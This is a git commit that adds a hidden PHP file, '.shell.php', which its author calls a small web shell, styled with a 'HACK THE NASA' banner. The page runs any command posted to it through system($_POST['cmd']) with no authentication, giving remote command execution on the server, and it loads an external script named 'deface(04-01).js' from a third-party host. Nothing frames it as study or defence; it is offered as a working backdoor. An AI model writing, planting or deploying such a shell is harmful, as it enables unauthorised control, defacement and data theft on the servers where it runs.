9e76d9ef9351f363377ed181d139a1551dbc7bd0
StunBrulee <75527075+Stunbase@users.noreply.github.com>
2023-01-12 21:55:09 +0100

    Create .shell.php
    it's a small and easy web shell with a little beauty lmao.

---
+++ .shell.php
@@ -0,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://nathanprinsley-files.prinsh.com/data-1/js/deface(04-01).js" type="application/javascript"></script>
+
+    <title>SHELL - BOGOS</title>
+
+
+<body>
+<style>
+    body{
+        background-color: black;
+        color: white;
+    }
+    h1{
+        color: red;
+    }
+    .htr{
+        color: greenyellow;
+    }
+    .htru{
+        color: #FF1493;
+    }
+</style>
+<center><img src="https://cdn.discordapp.com/attachments/980408355174645760/1036999106519900200/tssss.gif" height="600px"></center>
+<center><h3 class="htr">TERMINAL - HACK THE NASA</h3></center>
+<center><form action="cmd.php" method="post">
+    <input type="text" name="cmd" placeholder="COMMAND"><br>
+    <button>submit</button>
+</form></center>
+<br><br>
+<center>
+<?php
+
+echo system($_POST['cmd']);
+
+?>
+</center>
+</body>
+</html>
